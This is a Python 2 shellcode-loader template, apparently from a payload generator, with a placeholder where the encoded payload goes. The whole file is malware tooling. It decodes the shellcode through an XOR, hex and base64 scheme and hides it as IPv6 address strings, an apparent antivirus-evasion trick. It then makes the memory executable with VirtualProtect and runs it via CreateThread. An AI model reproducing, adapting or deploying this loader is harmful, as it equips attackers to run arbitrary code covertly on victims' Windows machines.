import ctypes
import random
import base64
from ctypes import *
from ctypes.wintypes import *

def test(string, module='encode', key=random.randint(1, 255)):
    if module == 'encode':
        buf = bytearray(string)
        encode_code = b''
        for i in buf:
            b = (255 - i) ^ key
            encode_code += chr(b).encode('hex')
        encode_code += chr(key).encode('hex')
        result = base64.b64encode(encode_code)
        return result
    elif module == 'decode':
        decode_code = bytearray(base64.b64decode(string).decode('hex'))
        sh3llc0de = b""
        key = decode_code[-1]
        for i in decode_code[0:-1]:
            b = 255 - (i ^ key)
            sh3llc0de += chr(b)
        return sh3llc0de
    else:
        print('???')


sh3llc0de_m = "${sh3llc0de_m}"
sh3llc0de = test(sh3llc0de_m, 'decode')
sh3llc0de += b"\x00" * 16

ipv6address = ctypes.windll.kernel32.VirtualAlloc(0, len(sh3llc0de)/16*46, 0x3000, 0x04)

for i in range(len(sh3llc0de)/16):
     bytes_a = sh3llc0de[i*16:16+i*16]
     ctypes.windll.Ntdll.RtlIpv6AddressToStringA(bytes_a, ipv6address+i*46)

list = []
for i in range(len(sh3llc0de)/16):
    d = ctypes.string_at(ipv6address+i*46,46)
    list.append(d)

pttr = ctypes.windll.kernel32.VirtualAlloc(0, len(sh3llc0de), 0x3000, 0x04)
ptr1 = pttr

for i in range(len(list)):
    ctypes.windll.Ntdll.RtlIpv6StringToAddressA(list[i],list[i],ptr1)
    ptr1 += 16

ctypes.windll.kernel32.VirtualProtect(pttr, len(sh3llc0de), 0x40, ctypes.byref(ctypes.c_long(1)))
handle = ctypes.windll.kernel32.CreateThread(0, 0, pttr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)